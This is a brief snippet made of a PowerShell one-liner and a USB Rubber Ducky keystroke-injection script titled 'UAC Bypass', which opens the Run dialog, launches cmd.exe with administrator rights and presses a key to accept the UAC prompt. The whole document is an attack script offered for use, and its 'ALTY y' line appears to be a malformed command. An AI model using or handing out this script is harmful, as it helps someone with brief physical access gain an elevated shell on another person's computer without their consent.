# 1 - Open Command Prompt via Run

```
powershell Start-Process cmd.exe -Verb runAs

ALT + y
```

# Ducky Script

```
REM *** UAC Bypass ***
DELAY 2000
WINDOWS r
DELAY 200
STRING powershell Start-Process cmd.exe -Verb runAs
ENTER
DELAY 2000
ALTY y
DELAY 500
```